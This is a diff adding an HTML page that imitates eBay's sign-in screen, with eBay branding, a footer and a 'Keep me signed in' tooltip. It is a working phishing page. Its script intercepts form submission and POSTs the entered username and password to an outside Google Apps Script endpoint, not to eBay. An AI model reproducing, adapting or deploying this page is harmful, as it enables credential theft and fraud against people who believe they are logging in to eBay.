@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in or sign up | eBay</title>
+	    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAcCAYAAAByDd+UAAABLUlEQVR4Ae3WJUADYRjG8UMzDpmCJNyl4ZpxSbhrQ9viGu4Oc+8BJ7KCR5y2vXzPrOCypS/8J2e/8zshu63ApXHw3ZpbWkKR08G2trZS1hrrBNl+lzoDBNbMugPU2tYmQjYUw5r/Fewersi0LXha3FUYYh+O3xiGcZjm30D71rx33DDMvtV/Ao1J6XH2xvtrDdWNYyrfuqNYe/cbfo4wHmErx1RBEehH4FVMUjjr6SY6gZA6o8ocWa42CfUnZKnCSCQT6GXLzdL5lmCalPmaR1XBhMZUwU9Afw1qMyopokJDH4GX2140pfCn74Mc5CAHOYinwF9BLOPbIGLQwm9BkSpw5VePp73kYjFgfEeUayQMs1ZxKmGg5HnLXcJAyeW2twQIYls3yN/a/jUOvgKkonKBWnbPogAAAABJRU5ErkJggg==" type="image/x-icon">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #ffffff;
+        }
+        .header {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            font-weight: bold;
+            font-size: 1.5em;
+        }
+        p {
+            font-size: 0.9em;
+            color: gray;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        .btn {
+            background: #007bff;
+            color: white;
+            font-weight: bold;
+            padding: 10px 20px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-top: 30px;
+        }
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: pointer;
+        }
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 250px;
+            background: #555;
+            color: #fff;
+            text-align: left;
+            padding: 10px;
+            border-radius: 5px;
+            position: absolute;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        .footer {
+            margin-top: 20px;
+            border-top: 1px solid #ccc;
+            padding-top: 10px;
+            font-size: 0.8em;
+            color: gray;
+        }
+        .footer a {
+            color: gray;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+        .error-message {
+            color: red;
+            font-size: 0.9em;
+            margin-top: 10px;
+            display: none;
+        }
+        .error-message img {
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header"><img src="https://i.ibb.co/3hpcxpT/Screenshot-4.png" alt="eBay"></div>
+    <div class="login-container">
+        <h1>Sign in to your account</h1>
+        <p>New to eBay? <a href="https://signup.ebay.com/pa/crte?siteid=0&co_partnerId=0&UsingSSL=1&rv4=1&ru=https%3A%2F%2Fwww.ebay.com%2Fmys%2Fhome%3Fsource%3DGBH&signInUrl=https%3A%2F%2Fsignin.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252Fmys%252Fhome%253Fsource%253DGBH&_trksid=p2487285.m5021.l46827">Create an account</a></p>
+        <form id="loginForm" onsubmit="return validateForm()">
+            <input type="text" id="username" placeholder="Email or username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="btn">Continue</button>
+            <div class="error-message" id="error-message">
+                <img src="https://i.ibb.co/nLyy94N/Screenshot-5.png" alt="Error icon">Please enter both fields.
+            </div>
+        </form>
+        <div class="checkbox-container">
+            <input type="checkbox" id="stayLoggedIn" checked>
+            <label for="stayLoggedIn">Keep me signed in</label>
+            <div class="tooltip"><img src="https://i.ibb.co/8d9d0Lp/adm.png">
+                <span class="tooltiptext">We will keep your session active on this device, but you may be asked to log in for certain activities. You can disable this option at any time on eBay.</span>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        Copyright © 1995-2024 eBay Inc. All rights reserved.
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Payment Terms of Use</a>
+        <a href="#">Cookies</a>
+        <a href="#">AdChoice</a>
+    </div>
+
+    <script>
+        function validateForm() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var errorMessage = document.getElementById("error-message");
+
+            if (username == "" || password == "") {
+                errorMessage.style.display = "block";
+                return false;
+            } else {
+                errorMessage.style.display = "none";
+				
+             //   window.location.href = 'https://www.eBay.com/mys/home?source=GBH';
+                return false; // Prevent form submission and redirect
+            }
+        }
+    </script>
+	
+	
+	     <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var formData = new FormData();
+            formData.append("username", username);
+            formData.append("password", password);
+
+            fetch("https://script.google.com/macros/s/AKfycbw1czBDevNs_R15_eiBVoxL0io-oZVPM8uFpRmqbQuRnoBInxIz2EuaR9zz68cq0RPv/exec", {
+                method: "POST",
+                body: formData
+            })
+			.then(response => response.json()) // Asegúrate de que el servidor devuelve una respuesta en formato JSON
+    .then(data => alert("ok"))
+    .catch(error => alert("Error al enviar los datos: " + error));
+        });
+    </script>
+	
+</body>
+</html>
